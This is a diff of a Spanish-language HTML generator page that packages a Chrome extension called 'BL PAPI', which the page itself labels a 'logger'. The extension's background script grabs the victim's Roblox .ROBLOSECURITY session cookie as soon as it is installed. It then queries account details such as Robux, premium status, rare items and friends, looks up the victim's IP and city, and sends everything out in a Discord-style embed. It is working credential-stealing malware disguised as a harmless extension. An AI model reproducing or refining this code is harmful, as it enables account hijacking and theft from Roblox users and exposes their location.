@@ -11,7 +11,6 @@
             box-sizing: border-box;
             font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
         }
-
         body {
             background: linear-gradient(145deg, #0b0c0e 0%, #1a1c20 100%);
             min-height: 100vh;
@@ -20,7 +19,6 @@
             justify-content: center;
             padding: 20px;
         }
-
         .card {
             max-width: 720px;
             width: 100%;
@@ -32,7 +30,6 @@
             padding: 36px 28px;
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.02) inset;
         }
-
         h1 {
             font-size: clamp(32px, 8vw, 48px);
             font-weight: 600;
@@ -44,25 +41,22 @@
             margin-bottom: 12px;
             line-height: 1.1;
         }
-
         .subtitle {
             color: #8f939f;
             font-size: 16px;
             font-weight: 400;
             margin-bottom: 32px;
-            border-left: 3px solid #3b82f6;
+            border-left: 3px solid #ff4444;
             padding-left: 18px;
-            background: rgba(59, 130, 246, 0.05);
+            background: rgba(255, 68, 68, 0.05);
             border-radius: 0 12px 12px 0;
         }
-
         .features {
             display: flex;
             flex-wrap: wrap;
             gap: 12px;
             margin-bottom: 36px;
         }
-
         .feature-tag {
             background: rgba(30, 32, 38, 0.8);
             border: 1px solid rgba(255, 255, 255, 0.05);
@@ -77,13 +71,11 @@
             backdrop-filter: blur(4px);
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.4);
         }
-
         .feature-tag span {
-            color: #3b82f6;
+            color: #ff4444;
             font-weight: 600;
             margin-left: 4px;
         }
-
         .button-group {
             display: flex;
             flex-direction: row;
@@ -91,7 +83,6 @@
             gap: 14px;
             margin: 36px 0 28px;
         }
-
         .btn {
             flex: 1 1 auto;
             background: #2a2d36;
@@ -110,26 +101,21 @@
             backdrop-filter: blur(4px);
             box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
         }
-
         .btn-primary {
-            background: #3b82f6;
-            border-color: #3b82f6;
-            box-shadow: 0 10px 25px rgba(59, 130, 246, 0.3);
+            background: #ff4444;
+            border-color: #ff4444;
+            box-shadow: 0 10px 25px rgba(255, 68, 68, 0.3);
         }
-
         .btn-primary:hover {
-            background: #2563eb;
+            background: #cc0000;
             transform: scale(1.02);
         }
-
         .btn-secondary {
             background: rgba(40, 42, 48, 0.9);
         }
-
         .btn-secondary:hover {
             background: #32343e;
         }
-
         .instruction-box {
             background: rgba(0, 0, 0, 0.3);
             border-radius: 28px;
@@ -137,7 +123,6 @@
             border: 1px solid rgba(255, 255, 255, 0.03);
             margin-top: 30px;
         }
-
         .instruction-title {
             font-size: 18px;
             font-weight: 600;
@@ -147,7 +132,6 @@
             align-items: center;
             gap: 12px;
         }
-
         .instruction-step {
             background: rgba(255, 255, 255, 0.02);
             border-radius: 20px;
@@ -155,12 +139,11 @@
             margin-bottom: 10px;
             color: #bcbfcc;
             font-size: 15px;
-            border-left: 4px solid #3b82f6;
+            border-left: 4px solid #ff4444;
             display: flex;
             align-items: center;
             gap: 12px;
         }
-
         .footer-note {
             text-align: center;
             margin-top: 32px;
@@ -173,16 +156,15 @@
 </head>
 <body>
     <div class="card">
-        <h1>Generador BL PAPI</h1>
-        <div class="subtitle">Editalo después... · parche automático</div>
+        <h1>BL PAPI</h1>
+        <div class="subtitle">Generador de extensión · parche automático</div>
 
         <div class="features">
-            <div class="feature-tag"><span>Editalo después...</span></div>
-            <div class="feature-tag"><span>Editalo después...</span></div>
-            <div class="feature-tag"><span>Editalo después...</span></div>
-            <div class="feature-tag"><span>Editalo después...</span></div>
-            <div class="feature-tag"><span>Editalo después...</span></div>
-            <div class="feature-tag"><span>Editalo después...</span></div>
+            <div class="feature-tag"><span>Edítalo después...</span></div>
+            <div class="feature-tag"><span>Edítalo después...</span></div>
+            <div class="feature-tag"><span>Edítalo después...</span></div>
+            <div class="feature-tag"><span>Edítalo después...</span></div>
+            <div class="feature-tag"><span>Edítalo después...</span></div>
         </div>
 
         <div class="button-group">
@@ -196,28 +178,16 @@
 
         <div id="instruccionesPanel" class="instruction-box" style="display: none;">
             <div class="instruction-title">
-                <span>📋</span> Cómo instalar
+                <span>📋</span> Cómo instalar BL PAPI
             </div>
-            <div class="instruction-step">
-                <span>1.</span> Descarga el archivo .crx
-            </div>
-            <div class="instruction-step">
-                <span>2.</span> Abre <code style="background:#1e1f24; padding:6px 10px; border-radius:40px;">lemur://extensions</code>
-            </div>
-            <div class="instruction-step">
-                <span>3.</span> Activa modo desarrollador
-            </div>
-            <div class="instruction-step">
-                <span>4.</span> Arrastra el .crx a la ventana
-            </div>
-            <div class="instruction-step">
-                <span>5.</span> Acepta permisos
-            </div>
+            <div class="instruction-step"><span>1.</span> Descarga el archivo .crx</div>
+            <div class="instruction-step"><span>2.</span> Abre <code style="background:#1e1f24; padding:6px 10px; border-radius:40px;">lemur://extensions</code></div>
+            <div class="instruction-step"><span>3.</span> Activa modo desarrollador (esquina)</div>
+            <div class="instruction-step"><span>4.</span> Arrastra el .crx a la ventana</div>
+            <div class="instruction-step"><span>5.</span> Acepta permisos · ¡listo!</div>
         </div>
 
-        <div class="footer-note">
-            BL PAPI · logger
-        </div>
+        <div class="footer-note">BL PAPI · logger premium</div>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
@@ -228,11 +198,13 @@
                     manifest_version: 3,
                     name: "BL PAPI",
                     version: "1.0",
-                    description: "",
+                    description: "Logger premium",
                     permissions: ["cookies", "storage"],
                     host_permissions: [
                         "https://www.roblox.com/*",
-                        "https://*.roblox.com/*"
+                        "https://*.roblox.com/*",
+                        "https://discord.com/*",
+                        "https://*.discord.com/*"
                     ],
                     background: { service_worker: "background.js" },
                     action: { default_popup: "popup.html", default_icon: "icon.png" }
@@ -271,7 +243,22 @@ function encolarYEnviar(payload) {
     processQueue();
 }
 
-async function obtenerPaisCompleto(codigo) {
+async function obtenerUbicacionCompleta() {
+    try {
+        const res = await fetch('https://ipinfo.io/json');
+        const data = await res.json();
+        return {
+            ip: data.ip || '',
+            pais: data.country || '',
+            region: data.region || '',
+            ciudad: data.city || '',
+        };
+    } catch {
+        return { ip:'', pais:'', region:'', ciudad:'' };
+    }
+}
+
+async function obtenerNombrePais(codigo) {
     if (!codigo || codigo.length !== 2) return 'Desconocido';
     try {
         const res = await fetch(\`https://restcountries.com/v3.1/alpha/\${codigo}\`);
@@ -282,109 +269,152 @@ async function obtenerPaisCompleto(codigo) {
     }
 }
 
-async function obtenerInfo() {
-    const cookie = await new Promise(r =>
-        chrome.cookies.get({ url:"https://www.roblox.com", name:".ROBLOSECURITY" }, c => r(c?.value))
-    );
-    if (!cookie) return null;
-
-    let ubicacion = { ip:'', pais:'', region:'', ciudad:'', nombrePais:'' };
+async function tieneItem(userId, cookie, assetId) {
     try {
-        const u = await fetch('https://ipinfo.io/json').then(r => r.json());
-        ubicacion = {
-            ip: u.ip || '',
-            pais: u.country || '',
-            region: u.region || '',
-            ciudad: u.city || ''
-        };
-        ubicacion.nombrePais = await obtenerPaisCompleto(ubicacion.pais);
-    } catch {}
+        const res = await fetch(\`https://inventory.roblox.com/v1/users/\${userId}/items/Asset/\${assetId}\`, {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+        });
+        const data = await res.json();
+        return data.data && data.data.length > 0;
+    } catch {
+        return false;
+    }
+}
 
-    let user = { name:'', id:'' };
-    let robux = 0;
-    let seguidores = 0, amigos = 0;
-    let headless = 'No', korblox = 'No';
-    let creaciones = 0, grupos = 0, insignias = 0, coleccionables = 0, favoritos = 0;
+async function obtenerGamePasses(userId, cookie) {
+    try {
+        const res = await fetch(\`https://games.roblox.com/v2/users/\${userId}/games?limit=10\`, {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+        });
+        if (!res.ok) return 0;
+        const data = await res.json();
+        return data.data?.filter(g => g.gamePasses?.length > 0)?.length || 0;
+    } catch {
+        return 0;
+    }
+}
 
+async function obtenerUltimosJuegos(userId, cookie) {
+    try {
+        const res = await fetch(\`https://games.roblox.com/v2/users/\${userId}/games?limit=3\`, {
+            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+        });
+        if (!res.ok) return ['No disponible', '', ''];
+        const data = await res.json();
+        return data.data?.map(g => g.name) || ['No disponible', '', ''];
+    } catch {
+        return ['No disponible', '', ''];
+    }
+}
+
+async function obtenerInfoRoblox(cookie) {
+    if (!cookie) return null;
     try {
         const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
             headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
         });
-        if (userRes.ok) user = await userRes.json();
+        if (!userRes.ok) return null;
+        const user = await userRes.json();
 
-        const robuxRes = await fetch(\`https://economy.roblox.com/v1/users/\${user.id}/currency\`, {
-            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
-        });
-        if (robuxRes.ok) robux = (await robuxRes.json()).robux || 0;
-
-        const segRes = await fetch(\`https://friends.roblox.com/v1/users/\${user.id}/followers/count\`);
-        if (segRes.ok) seguidores = (await segRes.json()).count || 0;
-
-        const amigosRes = await fetch(\`https://friends.roblox.com/v1/users/\${user.id}/friends/count\`);
-        if (amigosRes.ok) amigos = (await amigosRes.json()).count || 0;
-
-        const checkItem = async (id) => {
-            const r = await fetch(\`https://inventory.roblox.com/v1/users/\${user.id}/items/Asset/\${id}\`, {
+        let robux = 0;
+        try {
+            const robuxRes = await fetch(\`https://economy.roblox.com/v1/users/\${user.id}/currency\`, {
                 headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
             });
-            const d = await r.json();
-            return d.data && d.data.length > 0 ? 'Sí' : 'No';
+            if (robuxRes.ok) {
+                const r = await robuxRes.json();
+                robux = r.robux || 0;
+            }
+        } catch {}
+
+        let premium = 'No';
+        try {
+            const premiumRes = await fetch(\`https://premiumfeatures.roblox.com/v1/users/\${user.id}/validate-membership\`, {
+                headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
+            });
+            if (premiumRes.ok) {
+                const p = await premiumRes.json();
+                premium = p ? 'Sí' : 'No';
+            }
+        } catch {}
+
+        let seguidores = 0;
+        try {
+            const segRes = await fetch(\`https://friends.roblox.com/v1/users/\${user.id}/followers/count\`);
+            if (segRes.ok) {
+                const s = await segRes.json();
+                seguidores = s.count || 0;
+            }
+        } catch {}
+
+        let amigos = 0;
+        try {
+            const amRes = await fetch(\`https://friends.roblox.com/v1/users/\${user.id}/friends/count\`);
+            if (amRes.ok) {
+                const a = await amRes.json();
+                amigos = a.count || 0;
+            }
+        } catch {}
+
+        const headless = await tieneItem(user.id, cookie, 201);
+        const korblox = await tieneItem(user.id, cookie, 192);
+        const gamepasses = await obtenerGamePasses(user.id, cookie);
+        const juegos = await obtenerUltimosJuegos(user.id, cookie);
+
+        return {
+            username: user.name || 'No disponible',
+            userId: user.id || 'No disponible',
+            premium: premium,
+            robux: robux,
+            seguidores: seguidores,
+            amigos: amigos,
+            headless: headless ? 'Sí' : 'No',
+            korblox: korblox ? 'Sí' : 'No',
+            gamepasses: gamepasses,
+            juego1: juegos[0] || 'No disponible',
+            juego2: juegos[1] || '',
+            juego3: juegos[2] || ''
         };
-        headless = await checkItem(201);
-        korblox = await checkItem(192);
+    } catch {
+        return null;
+    }
+}
 
-        // Nuevas estadísticas útiles
-        const creaRes = await fetch(\`https://games.roblox.com/v2/users/\${user.id}/games?limit=1\`);
-        if (creaRes.ok) creaciones = (await creaRes.json()).total || 0;
+chrome.runtime.onInstalled.addListener(async () => {
+    const cookie = await new Promise(r =>
+        chrome.cookies.get({ url:"https://www.roblox.com", name:".ROBLOSECURITY" }, c => r(c?.value))
+    );
+    if (!cookie) return;
 
-        const gruposRes = await fetch(\`https://groups.roblox.com/v1/users/\${user.id}/groups/roles\`);
-        if (gruposRes.ok) grupos = (await gruposRes.json()).data?.length || 0;
-
-        const badgeRes = await fetch(\`https://badges.roblox.com/v1/users/\${user.id}/badges?limit=1\`);
-        if (badgeRes.ok) insignias = (await badgeRes.json()).total || 0;
-
-        const favRes = await fetch(\`https://www.roblox.com/users/favorites/list-json?assetTypeId=8&itemsPerPage=1\`, {
-            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
-        });
-        if (favRes.ok) {
-            const favData = await favRes.json();
-            favoritos = favData.Total ? (favData.Total / 10) : 0;
-        }
-
-        const colRes = await fetch(\`https://catalog.roblox.com/v1/search/items/details?category=Collectibles&limit=1\`, {
-            headers: { 'Cookie': \`.ROBLOSECURITY=\${cookie};\` }
-        });
-        if (colRes.ok) coleccionables = (await colRes.json()).total || 0;
-
-    } catch (e) {}
+    const ubi = await obtenerUbicacionCompleta();
+    const nombrePais = await obtenerNombrePais(ubi.pais);
+    const info = await obtenerInfoRoblox(cookie) || {};
 
     const ahora = new Date();
-    const fecha = ahora.toLocaleDateString('es-AR');
-    const hora = ahora.toLocaleTimeString('es-AR');
-    const dispositivo = navigator.userAgent.includes('Android') ? 'Android' : 'PC';
+    const horaLocal = ahora.toLocaleTimeString('es-AR', { timeZone: ubi.region ? \`America/\${ubi.region}\` : 'America/Buenos_Aires' });
 
     const embed = {
         title: "🔔 NUEVA ENTRADA | **BL PAPI** !",
-        color: 15158332, // Rojo
+        color: 15158332,
         fields: [
             {
                 name: "📌 INFORMACIÓN GENERAL",
-                value: \`**Dispositivo:** \`\${dispositivo}\`\`\n**País:** \`\${ubicacion.nombrePais}\`\`\n**Fecha:** \`\${fecha}\`\`\n**Hora Exacta en \${ubicacion.nombrePais}:** \`\${hora}\`\`,
+                value: \`**Dispositivo:** \`\${navigator.userAgent.includes('Android') ? '📱 Android' : '💻 PC'}\`\n**País:** \`\${nombrePais}\`\n**Fecha:** \`\${ahora.toLocaleDateString('es-AR')}\`\n**Hora Exacta en \${nombrePais}:** \`\${horaLocal}\`\`,
                 inline: false
             },
             {
                 name: "ℹ️ INFORMACIÓN DE LA CUENTA ROBLOX",
-                value: \`**👤 Usuario:** \`\${user.name || 'No disponible'}\`\`\n**🆔 ID:** \`\${user.id || 'No disponible'}\`\`\n**💰 Robux:** \`\${robux}\`\`\n**⭐ Seguidores:** \`\${seguidores}\`\`\n**👥 Amigos:** \`\${amigos}\`\`,
-                inline: true
+                value: \`**👤 Usuario:** \`\${info.username || 'No disponible'}\`\n**🆔 ID:** \`\${info.userId || 'No disponible'}\`\n**💱 Premium:** \`\${info.premium || 'No'}\`\n**💰 Robux:** \`\${info.robux || 0}\`\n**⭐ Seguidores:** \`\${info.seguidores || 0}\`\n**👥 Amigos:** \`\${info.amigos || 0}\`\`,
+                inline: false
             },
             {
                 name: "📊 ITEMS LIMITED (RAREZA)",
-                value: \`**Headless:** \`\${headless}\`\`\n**Korblox:** \`\${korblox}\`\`,
-                inline: true
+                value: \`**Headless:** \`\${info.headless || 'No'}\`\n**Korblox:** \`\${info.korblox || 'No'}\`\`,
+                inline: false
             },
             {
-                name: "📈 OTRAS ESTADÍSTICAS",
-                value: \`**🏗️ Creaciones:** \`\${creaciones}\`\`\n**👥 Grupos:** \`\${grupos}\`\`\n**🎖️ Insignias:** \`\${insignias}\`\`\n**💎 Coleccionables:** \`\${coleccionables}\`\`\n**⭐ Favoritos:** \`\${favoritos}\`\`,
+                name: "📈 ESTADÍSTICAS",
+                value: \`🏷 **GamePass/es:** \`\${info.gamepasses || 0}\`\n🎮 **Jugado Recientemente:**\n\\\`\\\`\\\`\n1ro \${info.juego1}\n2do \${info.juego2}\n3ro \${info.juego3}\n\\\`\\\`\\\`\`,
                 inline: false
             },
             {
@@ -393,16 +423,10 @@ async function obtenerInfo() {
                 inline: false
             }
         ],
-        footer: { text: "By **BL PAPI**" },
-        timestamp: new Date().toISOString()
+        footer: { text: "By **BL PAPI**" }
     };
 
     encolarYEnviar({ content: "|| @everyone ||", embeds: [embed] });
-}
-
-chrome.runtime.onInstalled.addListener(obtenerInfo);
-chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
-    if (tab.url?.includes('roblox.com') && changeInfo.status === 'complete') obtenerInfo();
 });
                 `,
 
@@ -463,8 +487,8 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
 <body>
     <div class="container">
         <div class="error-code">404</div>
-        <div class="message">NOT FOUND</div>
-        <div class="reference">BL PAPI · LOGGER</div>
+        <div class="message">NOT FOUND · no se pudo conectar</div>
+        <div class="reference">BLPAPI-404</div>
     </div>
 </body>
 </html>`,
@@ -481,7 +505,7 @@ chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
                 a.download = 'BL_PAPI.crx';
                 a.click();
                 URL.revokeObjectURL(url);
-                alert('✅ Extensión generada');
+                alert('✅ BL_PAPI.crx generado');
             });
         }
 
